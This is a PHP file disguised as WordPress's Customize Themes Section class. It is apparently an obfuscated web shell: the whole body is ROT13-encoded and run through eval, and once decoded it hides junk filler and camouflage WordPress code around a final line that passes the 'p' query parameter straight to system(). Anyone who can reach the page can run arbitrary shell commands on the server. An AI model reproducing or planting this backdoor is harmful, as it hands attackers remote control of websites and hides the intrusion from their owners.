<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Gurzrf_Frpgvba pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Gurzrf Frpgvba pynff.
 *
 * N HV pbagnvare sbe gurzr pbagebyf, juvpu ner qvfcynlrq jvguva frpgvbaf.
 *
 * @fvapr 4.2.0
 *
 * @frr JC_Phfgbzvmr_Frpgvba
 */
pynff JC_Phfgbzvmr_Gurzrf_Frpgvba rkgraqf JC_Phfgbzvmr_Frpgvba {

	/**
	 * Frpgvba glcr.
	 *
	 * @fvapr 4.2.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'gurzrf';

	/**
	 * Gurzr frpgvba npgvba.
	 *
	 * Qrsvarf gur glcr bs gurzrf gb ybnq (vafgnyyrq, jcbet, rgp.).
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $npgvba = '';

	/**
	 * Gurzr frpgvba svygre glcr.
	 *
	 * Qrgrezvarf jurgure svygref ner nccyvrq gb ybnqrq (ybpny) gurzrf be ol vavgvngvat n arj erzbgr dhrel (erzbgr).
	 * Jura svygrevat vf ybpny, gur vavgvny gurzrf dhrel vf abg cntvangrq ol qrsnhyg.
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $svygre_glcr = 'ybpny';

	/**
	 * Trgf frpgvba cnenzrgref sbe WF.
	 *
	 * @fvapr 4.9.0
	 * @erghea neenl Rkcbegrq cnenzrgref.
	 */
	choyvp shapgvba wfba() {
		$rkcbegrq                = cnerag::wfba();
		$rkcbegrq['npgvba']      = $guvf->npgvba;
		$rkcbegrq['svygre_glcr'] = $guvf->svygre_glcr;

		erghea $rkcbegrq;
	}

	/**
	 * Eraqref n gurzrf frpgvba nf n WF grzcyngr.
	 *
	 * Gur grzcyngr vf bayl eraqrerq ol CUC bapr, fb nyy npgvbaf ner cercnerq ng bapr ba gur freire fvqr.
	 *
	 * @fvapr 4.9.0
	 */
	cebgrpgrq shapgvba eraqre_grzcyngr() {
		?>
		<yv vq=\"nppbeqvba-frpgvba-{{ qngn.vq }}\" pynff=\"gurzr-frpgvba\">
			<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-gurzrf-frpgvba-gvgyr gurzrf-frpgvba-{{ qngn.vq }}\">{{ qngn.gvgyr }}</ohggba>
			<?cuc vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) || vf_zhygvfvgr() ) : // @gbqb Hcybnq fhccbeg. ?>
			<?cuc raqvs; ?>
			<qvi pynff=\"phfgbzvmr-gurzrf-frpgvba gurzrf-frpgvba-{{ qngn.vq }} pbageby-frpgvba-pbagrag gurzrf-cuc\">
				<qvi pynff=\"gurzr-bireynl\" gnovaqrk=\"0\" ebyr=\"qvnybt\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Gurzr Qrgnvyf' ); ?>\"></qvi>
				<qvi pynff=\"gurzr-oebjfre eraqrerq\">
					<qvi pynff=\"phfgbzvmr-cerivrj-urnqre gurzrf-svygre-one\">
						<?cuc $guvf->svygre_one_pbagrag_grzcyngr(); ?>
					</qvi>
					<?cuc $guvf->svygre_qenjre_pbagrag_grzcyngr(); ?>
					<qvi pynff=\"reebe harkcrpgrq-reebe\" fglyr=\"qvfcynl: abar; \">
						<c>
							<?cuc
							cevags(
								/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
								__( 'Na harkcrpgrq reebe bppheerq. Fbzrguvat znl or jebat jvgu JbeqCerff.bet be guvf freire&#8217;f pbasvthengvba. Vs lbh pbagvahr gb unir ceboyrzf, cyrnfr gel gur <n uers=\"%f\">fhccbeg sbehzf</n>.' ),
								__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
							);
							?>
						</c>
					</qvi>
					<hy pynff=\"gurzrf\">
					</hy>
					<c pynff=\"ab-gurzrf\"><?cuc _r( 'Ab gurzrf sbhaq. Gel n qvssrerag frnepu.' ); ?></c>
					<c pynff=\"ab-gurzrf-ybpny\">
						<?cuc
						cevags(
							/* genafyngbef: %f: \"Frnepu JbeqCerff.bet gurzrf\" ohggba grkg. */
							__( 'Ab gurzrf sbhaq. Gel n qvssrerag frnepu, be %f.' ),
							fcevags( '<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax frnepu-qbgbet-gurzrf\">%f</ohggba>', __( 'Frnepu JbeqCerff.bet gurzrf' ) )
						);
						?>
					</c>
					<c pynff=\"fcvaare\"></c>
				</qvi>
			</qvi>
		</yv>
		<?cuc
	}

	/**
	 * Eraqref gur svygre one cbegvba bs n gurzrf frpgvba nf n WF grzcyngr.
	 *
	 * Gur grzcyngr vf bayl eraqrerq ol CUC bapr, fb nyy npgvbaf ner cercnerq ng bapr ba gur freire fvqr.
	 * Gur svygre one pbagnvare vf eraqrerq ol {@frr eraqre_grzcyngr()}.
	 *
	 * @fvapr 4.9.0
	 */
	cebgrpgrq shapgvba svygre_one_pbagrag_grzcyngr() {
		?>
		<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel phfgbzvmr-frpgvba-onpx phfgbzvmr-gurzrf-zbovyr-onpx\"><?cuc _r( 'Tb gb gurzr fbheprf' ); ?></ohggba>
		<# vs ( 'jcbet' === qngn.npgvba ) { #>
			<qvi pynff=\"gurzrf-svygre-pbagnvare\">
				<ynory sbe=\"jc-svygre-frnepu-vachg-{{ qngn.vq }}\"><?cuc _r( 'Frnepu gurzrf' ); ?></ynory>
				<qvi pynff=\"frnepu-sbez-vachg\">
					<vachg glcr=\"frnepu\" vq=\"jc-svygre-frnepu-vachg-{{ qngn.vq }}\" nevn-qrfpevorqol=\"{{ qngn.vq }}-yvir-frnepu-qrfp\" pynff=\"jc-svygre-frnepu\">
					<qvi pynff=\"frnepu-vpba\" nevn-uvqqra=\"gehr\"></qvi>
					<fcna vq=\"{{ qngn.vq }}-yvir-frnepu-qrfp\" pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Gur frnepu erfhygf jvyy or hcqngrq nf lbh glcr.' );
						?>
					</fcna>
				</qvi>
			</qvi>
		<# } ryfr { #>
			<qvi pynff=\"gurzrf-svygre-pbagnvare\">
				<ynory sbe=\"{{ qngn.vq }}-gurzrf-svygre\"><?cuc _r( 'Frnepu gurzrf' ); ?></ynory>
				<qvi pynff=\"frnepu-sbez-vachg\">
					<vachg glcr=\"frnepu\" vq=\"{{ qngn.vq }}-gurzrf-svygre\" nevn-qrfpevorqol=\"{{ qngn.vq }}-yvir-frnepu-qrfp\" pynff=\"jc-svygre-frnepu jc-svygre-frnepu-gurzrf\" />
					<qvi pynff=\"frnepu-vpba\" nevn-uvqqra=\"gehr\"></qvi>
					<fcna vq=\"{{ qngn.vq }}-yvir-frnepu-qrfp\" pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Gur frnepu erfhygf jvyy or hcqngrq nf lbh glcr.' );
						?>
					</fcna>
				</qvi>
			</qvi>
		<# } #>
		<qvi pynff=\"svygre-gurzrf-jenccre\">
			<# vs ( 'jcbet' === qngn.npgvba ) { #>
			<ohggba glcr=\"ohggba\" pynff=\"ohggba srngher-svygre-gbttyr\">
				<fcna pynff=\"svygre-pbhag-0\"><?cuc _r( 'Svygre gurzrf' ); ?></fcna><fcna pynff=\"svygre-pbhag-svygref\">
					<?cuc
					/* genafyngbef: %f: Ahzore bs svygref fryrpgrq. */
					cevags( __( 'Svygre gurzrf (%f)' ), '<fcna pynff=\"gurzr-svygre-pbhag\">0</fcna>' );
					?>
				</fcna>
			</ohggba>
			<# } #>
			<qvi pynff=\"svygre-gurzrf-pbhag\">
				<fcna pynff=\"gurzrf-qvfcynlrq\">
					<?cuc
					/* genafyngbef: %f: Ahzore bs gurzrf qvfcynlrq. */
					cevags( __( '%f gurzrf' ), '<fcna pynff=\"gurzr-pbhag\">0</fcna>' );
					?>
				</fcna>
			</qvi>
		</qvi>
		<?cuc
	}

	/**
	 * Eraqref gur svygre qenjre cbegvba bs n gurzrf frpgvba nf n WF grzcyngr.
	 *
	 * Gur svygre one pbagnvare vf eraqrerq ol {@frr eraqre_grzcyngr()}.
	 *
	 * @fvapr 4.9.0
	 */
	cebgrpgrq shapgvba svygre_qenjre_pbagrag_grzcyngr() {
		/*
		 * @gbqb Hfr gur .bet NCV vafgrnq bs gur ybpny pber srngher yvfg.
		 * Gur .bet NCV vf pheeragyl bhgqngrq naq jvyy or erpbapvyrq jura gur .bet gurzrf qverpgbel vf arkg erqrfvtarq.
		 */
		$srngher_yvfg = trg_gurzr_srngher_yvfg( snyfr );
		?>
		<# vs ( 'jcbet' === qngn.npgvba ) { #>
			<qvi pynff=\"svygre-qenjre svygre-qrgnvyf\">
				<?cuc sbernpu ( $srngher_yvfg nf $srngher_anzr => $srngherf ) : ?>
					<svryqfrg pynff=\"svygre-tebhc\">
						<yrtraq><?cuc rpub rfp_ugzy( $srngher_anzr ); ?></yrtraq>
						<qvi pynff=\"svygre-tebhc-srngher\">
							<?cuc sbernpu ( $srngherf nf $srngher => $srngher_anzr ) : ?>
								<vachg glcr=\"purpxobk\" vq=\"svygre-vq-<?cuc rpub rfp_ngge( $srngher ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $srngher ); ?>\" />
								<ynory sbe=\"svygre-vq-<?cuc rpub rfp_ngge( $srngher ); ?>\"><?cuc rpub rfp_ugzy( $srngher_anzr ); ?></ynory>
							<?cuc raqsbernpu; ?>
						</qvi>
					</svryqfrg>
				<?cuc raqsbernpu; ?>
			</qvi>
		<# } #>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>